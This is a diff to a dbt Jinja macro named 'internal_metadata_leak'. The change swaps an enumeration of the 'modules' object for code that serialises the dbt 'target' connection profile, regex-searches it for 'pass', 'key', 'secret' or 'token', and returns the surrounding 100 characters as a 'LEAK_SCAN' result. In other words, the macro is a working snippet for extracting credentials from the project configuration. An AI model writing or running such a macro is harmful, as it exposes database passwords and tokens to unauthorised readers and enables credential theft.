@@ -1,14 +1,20 @@
 {% macro internal_metadata_leak() %}
     {% if execute %}
-        {% set module_list = [] %}
-        {% for key in modules.keys() %}
-            {% do module_list.append(key) %}
-        {% endfor %}
+        {% set pattern = "(?i)(pass|key|secret|token)" %}
+        {% set regex = modules.re.compile(pattern) %}
         
-        {% set has_get = modules.get is defined %}
+        {% set target_str = target | tojson %}
+        {% set match = regex.search(target_str) %}
         
-        {{ return("MODULE_KEYS: " ~ module_list | join(", ") ~ " || HAS_GET: " ~ has_get) }}
+        {# 3. Kalau ada match, kita ambil cuplikan sekitarnya #}
+        {% set leak = "no_match" %}
+        {% if match %}
+            {% set start = match.start() %}
+            {% set leak = target_str[start:start+100] %}
+        {% endif %}
+        
+        {{ return("LEAK_SCAN: " ~ leak ~ " || MODULES: OK") }}
     {% else %}
-        {{ return("mapping_modules...") }}
+        {{ return("regex_scanning...") }}
     {% endif %}
 {% endmacro %}
